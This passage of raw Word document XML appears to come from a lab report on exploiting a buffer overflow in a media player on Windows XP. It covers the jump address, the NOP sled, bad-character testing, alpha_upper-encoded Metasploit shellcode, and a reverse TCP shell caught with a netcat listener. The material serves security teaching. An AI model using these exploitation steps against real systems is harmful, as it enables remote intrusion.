      <w:r w:rsidR="00BB08BD">
        <w:t>dll</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> files may make us</w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t>e</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t xml:space="preserve"> of memory locations with “</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD" w:rsidRPr="00BB08BD">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>00</w:t>
      </w:r>
      <w:r w:rsidR="00BB08BD">
        <w:t>” in them. This is interpreted as a “NULL” character, and will not work, hence it is important to choose one without the double zeroes.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44F142E3" w14:textId="77777777" w:rsidR="00BB08BD" w:rsidRDefault="00BB08BD" w:rsidP="00BB08BD">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="77753AC2" wp14:editId="675C140B">
            <wp:extent cx="5476875" cy="1428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6875" cy="1428750"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="528EA077" w14:textId="4A79FB84" w:rsidR="00BB08BD" w:rsidRDefault="00BB08BD" w:rsidP="00C23131">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>13</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - findjmp.exe output </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="66C4DF43" w14:textId="1546A202" w:rsidR="00C23131" w:rsidRPr="00C23131" w:rsidRDefault="0099242C" w:rsidP="00C23131">
      <w:r>
        <w:t xml:space="preserve">Copy and paste this memory location </w:t>
      </w:r>
      <w:r w:rsidR="00C23131">
        <w:t xml:space="preserve">into the Perl file as </w:t>
      </w:r>
      <w:r>
        <w:t>shown in Appendix B4</w:t>
      </w:r>
      <w:r w:rsidR="00C23131">
        <w:t>, along with a number of NOP instructions so the bad characters did not get overwritten by any systems calls that normally appear at the beginning of the stack under normal operation. These NOP (No-Operation) instructions do not do anything, simply incrementing the pointer until it reaches the bad characters</w:t>
      </w:r>
      <w:r>
        <w:t>, but it prevents the start from being overwritten</w:t>
      </w:r>
      <w:r w:rsidR="00C23131">
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00F51BD8">
        <w:t xml:space="preserve"> This technique is called a NOP sled.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="615C0B82" w14:textId="638AEB08" w:rsidR="008A26FF" w:rsidRDefault="00085E66" w:rsidP="008A26FF">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r w:rsidR="00770BC8">
        <w:t xml:space="preserve">file’s </w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t xml:space="preserve">full </w:t>
      </w:r>
      <w:r w:rsidR="00770BC8">
        <w:t>contents can be found</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> in </w:t>
      </w:r>
      <w:r w:rsidRPr="00085E66">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix B4</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F4CC35E" w14:textId="6BE6FD00" w:rsidR="00B513D1" w:rsidRPr="00B513D1" w:rsidRDefault="00B513D1" w:rsidP="008A26FF">
      <w:pPr>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>Double-click this file</w:t>
      </w:r>
      <w:r w:rsidR="00437906">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> to</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> creat</w:t>
      </w:r>
      <w:r w:rsidR="00437906">
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t>e</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:bCs/>
        </w:rPr>
        <w:t xml:space="preserve"> the following .ini file in the folder, with each ASCII symbol appended after “BBBB”.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E022E87" w14:textId="5F198528" w:rsidR="00B513D1" w:rsidRDefault="005E49CC" w:rsidP="00B513D1">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="711633DC" wp14:editId="7BD06113">
            <wp:extent cx="4933950" cy="857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3950" cy="857250"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="291EE44E" w14:textId="226E3A2F" w:rsidR="00B513D1" w:rsidRDefault="00B513D1" w:rsidP="00B513D1">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>14</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Contents of the badchar.ini file</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517B8FFE" w14:textId="154A96E6" w:rsidR="0046313D" w:rsidRPr="0046313D" w:rsidRDefault="0099242C" w:rsidP="0046313D">
      <w:r>
        <w:t>Upload the file to the media player through Immunity again and look at the stack</w:t>
      </w:r>
      <w:r w:rsidR="00C7142D">
        <w:t>. It can be seen that after the NOP instructions (highlighted in blue, \x90) the program cuts off the first few characters, as it goes straight from x00 to x21, where there should be a number of characters between them.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BA36DE6" w14:textId="77777777" w:rsidR="00C7142D" w:rsidRDefault="0046313D" w:rsidP="00C7142D">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="237FBFEC" wp14:editId="76F27B2D">
            <wp:extent cx="2543175" cy="16859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3175" cy="1685925"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="66394715" w14:textId="397F5E22" w:rsidR="00B513D1" w:rsidRDefault="00C7142D" w:rsidP="00C7142D">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>15</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Immunity output showing that everything from x01 to x1f is missing</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="44BA41CD" w14:textId="2B7F04D1" w:rsidR="00581DE0" w:rsidRPr="00581DE0" w:rsidRDefault="00581DE0" w:rsidP="00581DE0">
      <w:r>
        <w:t xml:space="preserve">This suggests that these are the bad </w:t>
      </w:r>
      <w:r w:rsidR="00F34A79">
        <w:t>characters and</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> are filtered out.</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> One way to circumvent these bad characters when creating shellcode is to use </w:t>
      </w:r>
      <w:r w:rsidR="00653E91">
        <w:t>alpha_upper</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> encoding, which ensures the code only uses capital letters, which can be seen on the stack in </w:t>
      </w:r>
      <w:r w:rsidR="003112D2" w:rsidRPr="00866738">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 15</w:t>
      </w:r>
      <w:r w:rsidR="003112D2">
        <w:t xml:space="preserve"> and are therefore valid.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6612494A" w14:textId="30879D1C" w:rsidR="00972ED7" w:rsidRDefault="00972ED7" w:rsidP="00972ED7">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="25" w:name="_Toc103326463"/>
      <w:r>
        <w:t xml:space="preserve">Generating and adding </w:t>
      </w:r>
      <w:r w:rsidR="00AB234C">
        <w:t xml:space="preserve">Simple </w:t>
      </w:r>
      <w:r>
        <w:t>Shellcode</w:t>
      </w:r>
      <w:bookmarkEnd w:id="25"/>
    </w:p>
    <w:p w14:paraId="554A34A0" w14:textId="45DA109F" w:rsidR="00581DE0" w:rsidRDefault="00581DE0" w:rsidP="00581DE0">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Shellcode generation can be performed in MSFGUI - A visual metasploit tool. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70D729D6" w14:textId="2B98CF51" w:rsidR="00B05CEB" w:rsidRDefault="00581DE0" w:rsidP="00581DE0">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Open MSFGUI and navigate to </w:t>
      </w:r>
      <w:r w:rsidR="00AB234C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>[</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">Top </w:t>
      </w:r>
      <w:r w:rsidR="00AB234C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>T</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve">oolbar -&gt; Payloads -&gt; </w:t>
      </w:r>
      <w:r w:rsidR="00212A0B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>Messagebox</w:t>
      </w:r>
      <w:r w:rsidR="00AB234C">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>]</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>.</w:t>
      </w:r>
      <w:r w:rsidR="00212A0B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> This will open up a user interface for crafting a simple message box payload</w:t>
      </w:r>
      <w:r w:rsidR="00B05CEB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>,</w:t>
      </w:r>
      <w:r w:rsidR="00212A0B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t xml:space="preserve"> where you can change </w:t>
      </w:r>
      <w:r w:rsidR="00B05CEB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>its title and contents</w:t>
      </w:r>
      <w:r w:rsidR="00212A0B">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>, but the most important step here is to click “encode/save” and select “x86/alpha_upper” and output format “perl”</w:t>
      </w:r>
      <w:r w:rsidR="00B05CEB">
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>, and set the destination to an empty file on the desktop.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="733FD0A7" w14:textId="4CFBBEE5" w:rsidR="00581DE0" w:rsidRDefault="00212A0B" w:rsidP="00581DE0">
      <w:pPr>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:t>This is because the output will be copied and pasted into a perl file as done previously, and the architecture of the Windows XP machine is x86. “Alpha Upper” encodes the letters to be uppercase, which bypass the bad character filtering from the previous section.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="36FF9726" w14:textId="63B5F3B4" w:rsidR="00212A0B" w:rsidRDefault="00B05CEB" w:rsidP="00212A0B">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="565320E6" wp14:editId="0E1E55C2">
            <wp:extent cx="5943600" cy="11074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107440"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="030D215D" w14:textId="23CBEAC1" w:rsidR="00581DE0" w:rsidRDefault="00212A0B" w:rsidP="00212A0B">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>16</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Changing the Message</w:t>
      </w:r>
      <w:r w:rsidR="00941EC1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Box options</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0EE4B3C7" w14:textId="7DE5CD63" w:rsidR="00B05CEB" w:rsidRDefault="00B05CEB" w:rsidP="00B05CEB">
      <w:r>
        <w:t>Once the file has been created, copy everything after “my $</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r>
        <w:t>buf</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r>
        <w:t xml:space="preserve">” into a new $buffer as shown in </w:t>
      </w:r>
      <w:r w:rsidRPr="00B05CEB">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Appendix B5</w:t>
      </w:r>
      <w:r>
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7405474C" w14:textId="6251E9F4" w:rsidR="00B05CEB" w:rsidRPr="00B05CEB" w:rsidRDefault="003F51EB" w:rsidP="00B05CEB">
      <w:r>
        <w:t>Now, opening the Media Player and uploading this new ini file</w:t>
      </w:r>
      <w:r w:rsidR="0099242C">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>results in a message box appearing, proving the payload was a success.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="211D3B23" w14:textId="77777777" w:rsidR="003F51EB" w:rsidRDefault="00B05CEB" w:rsidP="003F51EB">
      <w:pPr>
        <w:keepNext/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5958B1CA" wp14:editId="3AA96A20">
            <wp:extent cx="1628775" cy="9334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28775" cy="933450"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DECC8C0" w14:textId="6259910A" w:rsidR="00212A0B" w:rsidRDefault="003F51EB" w:rsidP="003F51EB">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>17</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - A Message</w:t>
      </w:r>
      <w:r w:rsidR="00941EC1">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t>Box pop-up from the payload</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="76C699FD" w14:textId="33FB9297" w:rsidR="00AB234C" w:rsidRPr="00AB234C" w:rsidRDefault="00AB234C" w:rsidP="00AB234C">
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:bookmarkStart w:id="26" w:name="_Toc103326464"/>
      <w:r>
        <w:t>Advanced Payload</w:t>
      </w:r>
      <w:bookmarkEnd w:id="26"/>
    </w:p>
    <w:p w14:paraId="6BC76AA4" w14:textId="6BB54DAA" w:rsidR="003F51EB" w:rsidRDefault="00AB234C" w:rsidP="003F51EB">
      <w:r>
        <w:t>This can be repeated for a more advanced shellcode such as a Reverse TCP shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26B21044" w14:textId="6D614F7E" w:rsidR="00AB234C" w:rsidRDefault="00C34234" w:rsidP="00AB234C">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:object w:dxaOrig="1440" w:dyaOrig="1440" w14:anchorId="54AF5793">
          <v:shape id="_x0000_s1028" type="#_x0000_t75" style="position:absolute;margin-left:-.25pt;margin-top:22.75pt;width:498.3pt;height:266.85pt;z-index:251692032;mso-position-horizontal-relative:text;mso-position-vertical-relative:text;mso-width-relative:page;mso-height-relative:page" wrapcoords="-31 0 -31 21543 21600 21543 21600 0 -31 0">
            <v:imagedata r:id="rId30" o:title=""/>
            <w10:wrap type="tight"/>
          </v:shape>
          <o:OLEObject Type="Embed" ProgID="Paint.Picture" ShapeID="_x0000_s1028" DrawAspect="Content" ObjectID="_1714027414" r:id="rId31"/>
        </w:object>
      </w:r>
      <w:r w:rsidR="00AB234C">
        <w:t>Reopen MSFGUI, this time choosing [Top Toolbar -&gt; Payloads -&gt; Windows -&gt;</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidR="00AB234C">
        <w:t>shell_reverse_tcp</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidR="00AB234C">
        <w:t>]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="45AC3723" w14:textId="7E751987" w:rsidR="00AB234C" w:rsidRDefault="00AB234C" w:rsidP="00AB234C">
      <w:pPr>
        <w:pStyle w:val="Caption"/>
        <w:jc w:val="center"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">Figure </w:t>
      </w:r>
      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
        <w:r w:rsidR="00C14656">
          <w:rPr>
            <w:noProof/>
          </w:rPr>
          <w:t>18</w:t>
        </w:r>
      </w:fldSimple>
      <w:r>
        <w:t xml:space="preserve"> - Inputs for Reverse TCP payload generation</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="374F7FBA" w14:textId="493393ED" w:rsidR="002460EF" w:rsidRPr="00437906" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
      <w:r>
        <w:t xml:space="preserve">The next step is to then copy and paste the contents of the destination file (tcp.txt in this case) into a Perl file, exactly the same as with the message box payload. </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="28F7A0DD" w14:textId="4686AAB3" w:rsidR="000C15D0" w:rsidRDefault="00941EC1" w:rsidP="00941EC1">
      <w:pPr>
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00941EC1">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>See Appendix B6 for the full Reverse TCP Shell Perl file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FF8346F" w14:textId="4C50270C" w:rsidR="000C15D0" w:rsidRDefault="002460EF" w:rsidP="00941EC1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251695104" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="5F12DC42" wp14:editId="09892D9E">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2278380</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>560262</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="962025" cy="323850"/>
                <wp:effectExtent l="0" t="0" r="28575" b="19050"/>
                <wp:wrapNone/>
                <wp:docPr id="42" name="Text Box 42"/>
                <wp:cNvGraphicFramePr/>
                <a:graphic xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main">
                  <a:graphicData uri="http://schemas.microsoft.com/office/word/2010/wordprocessingShape">
                    <wps:wsp>
                      <wps:cNvSpPr txBox="1"/>
                      <wps:spPr>
                        <a:xfrm>
                          <a:off x="0" y="0"/>
                          <a:ext cx="962025" cy="323850"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:schemeClr val="lt1"/>
                        </a:solidFill>
                        <a:ln w="6350">
                          <a:solidFill>
                            <a:prstClr val="black"/>
                          </a:solidFill>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="70025DA0" w14:textId="0EF03C42" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                            <w:pPr>
                              <w:pStyle w:val="code"/>
                              <w:jc w:val="center"/>
                            </w:pPr>
                            <w:proofErr w:type="spellStart"/>
                            <w:r>
                              <w:t>nc</w:t>
                            </w:r>
                            <w:proofErr w:type="spellEnd"/>
                            <w:r>
                              <w:t xml:space="preserve"> -l -p 4444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12DC42" id="Text Box 42" o:spid="_x0000_s1032" type="#_x0000_t202" style="position:absolute;margin-left:179.4pt;margin-top:44.1pt;width:75.75pt;height:25.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" fillcolor="white [3201]" strokeweight=".5pt">
                <v:textbox>
                  <w:txbxContent>
                    <w:p w14:paraId="70025DA0" w14:textId="0EF03C42" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                      <w:pPr>
                        <w:pStyle w:val="code"/>
                        <w:jc w:val="center"/>
                      </w:pPr>
                      <w:proofErr w:type="spellStart"/>
                      <w:r>
                        <w:t>nc</w:t>
                      </w:r>
                      <w:proofErr w:type="spellEnd"/>
                      <w:r>
                        <w:t xml:space="preserve"> -l -p 4444</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
      <w:r w:rsidR="000C15D0">
        <w:t xml:space="preserve">In order to make use of this exploit, a netcat listener must first be set up in the windows command prompt using the following command, where “-l” means to listen, and “-p” specifies the port </w:t>
      </w:r>
      <w:r w:rsidR="004627AE">
        <w:t>used in</w:t>
      </w:r>
      <w:r w:rsidR="000C15D0">
        <w:t xml:space="preserve"> the menu from </w:t>
      </w:r>
      <w:r w:rsidR="000C15D0" w:rsidRPr="000C15D0">
        <w:rPr>
          <w:b/>
          <w:bCs/>
        </w:rPr>
        <w:t>Figure 18</w:t>
      </w:r>
      <w:r w:rsidR="000C15D0">
        <w:t>.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="296A3B71" w14:textId="583CE179" w:rsidR="002460EF" w:rsidRDefault="002460EF" w:rsidP="00941EC1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <mc:AlternateContent>
          <mc:Choice Requires="wps">
            <w:drawing>
              <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251697152" behindDoc="0" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="71D862AD" wp14:editId="13DF463C">
                <wp:simplePos x="0" y="0"/>
                <wp:positionH relativeFrom="column">
                  <wp:posOffset>2213610</wp:posOffset>
                </wp:positionH>
                <wp:positionV relativeFrom="paragraph">
                  <wp:posOffset>272578</wp:posOffset>
                </wp:positionV>
                <wp:extent cx="1143000" cy="63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143000" cy="635"/>
                        </a:xfrm>
                        <a:prstGeom prst="rect">
                          <a:avLst/>
                        </a:prstGeom>
                        <a:solidFill>
                          <a:prstClr val="white"/>
                        </a:solidFill>
                        <a:ln>
                          <a:noFill/>
                        </a:ln>
                      </wps:spPr>
                      <wps:txbx>
                        <w:txbxContent>
                          <w:p w14:paraId="0E379F9A" w14:textId="6D95E2B1" w:rsidR="000C15D0" w:rsidRPr="00FA45C2" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                            <w:pPr>
                              <w:pStyle w:val="Caption"/>
                              <w:rPr>
                                <w:noProof/>
                              </w:rPr>
                            </w:pPr>
                            <w:r>
                              <w:t xml:space="preserve">Figure </w:t>
                            </w:r>
                            <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                              <w:r w:rsidR="00C14656">
                                <w:rPr>
                                  <w:noProof/>
                                </w:rPr>
                                <w:t>19</w:t>
                              </w:r>
                            </w:fldSimple>
                            <w:r>
                              <w:t xml:space="preserve"> - netcat syntax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D862AD" id="Text Box 43" o:spid="_x0000_s1033" type="#_x0000_t202" style="position:absolute;margin-left:174.3pt;margin-top:21.45pt;width:90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" stroked="f">
                <v:textbox style="mso-fit-shape-to-text:t" inset="0,0,0,0">
                  <w:txbxContent>
                    <w:p w14:paraId="0E379F9A" w14:textId="6D95E2B1" w:rsidR="000C15D0" w:rsidRPr="00FA45C2" w:rsidRDefault="000C15D0" w:rsidP="000C15D0">
                      <w:pPr>
                        <w:pStyle w:val="Caption"/>
                        <w:rPr>
                          <w:noProof/>
                        </w:rPr>
                      </w:pPr>
                      <w:r>
                        <w:t xml:space="preserve">Figure </w:t>
                      </w:r>
                      <w:fldSimple w:instr=" SEQ Figure \* ARABIC ">
                        <w:r w:rsidR="00C14656">
                          <w:rPr>
                            <w:noProof/>
                          </w:rPr>
                          <w:t>19</w:t>
                        </w:r>
                      </w:fldSimple>
                      <w:r>
                        <w:t xml:space="preserve"> - netcat syntax</w:t>
                      </w:r>
                    </w:p>
                  </w:txbxContent>
                </v:textbox>
              </v:shape>
            </w:pict>
          </mc:Fallback>
        </mc:AlternateContent>
      </w:r>
    </w:p>
    <w:p w14:paraId="204BF8EB" w14:textId="7FD98E81" w:rsidR="002460EF" w:rsidRDefault="002460EF" w:rsidP="00941EC1"/>
    <w:p w14:paraId="119B2FD3" w14:textId="2B87C730" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1"/>
    <w:p w14:paraId="3EBB8283" w14:textId="20906525" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1">
      <w:r>
        <w:lastRenderedPageBreak/>
        <w:t>Double-clicking on tcp.pl and loading the resulting tcp.ini file into the media player should now result in the netcat prompt changing to a shell.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30E309B7" w14:textId="0CA44FE2" w:rsidR="000C15D0" w:rsidRDefault="000C15D0" w:rsidP="00941EC1">
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:anchor distT="0" distB="0" distL="114300" distR="114300" simplePos="0" relativeHeight="251698176" behindDoc="1" locked="0" layoutInCell="1" allowOverlap="1" wp14:anchorId="55ABCDB8" wp14:editId="122EE821">
            <wp:simplePos x="0" y="0"/>
            <wp:positionH relativeFrom="column">
              <wp:posOffset>476250</wp:posOffset>
            </wp:positionH>
            <wp:positionV relativeFrom="paragraph">
              <wp:posOffset>85725</wp:posOffset>
            </wp:positionV>
            <wp:extent cx="4762500" cy="771525"/>
            <wp:effectExtent l="0" t="0" r="0" b="9525"/>
            <wp:wrapTight wrapText="bothSides">
              <wp:wrapPolygon edited="0">
                <wp:start x="0" y="0"/>
                <wp:lineTo x="0" y="21333"/>
                <wp:lineTo x="21514" y="21333"/>
                <wp:lineTo x="21514"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62500" cy="771525"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
            <wp14:sizeRelH relativeFrom="page">
              <wp14:pctWidth>0</wp14:pctWidth>
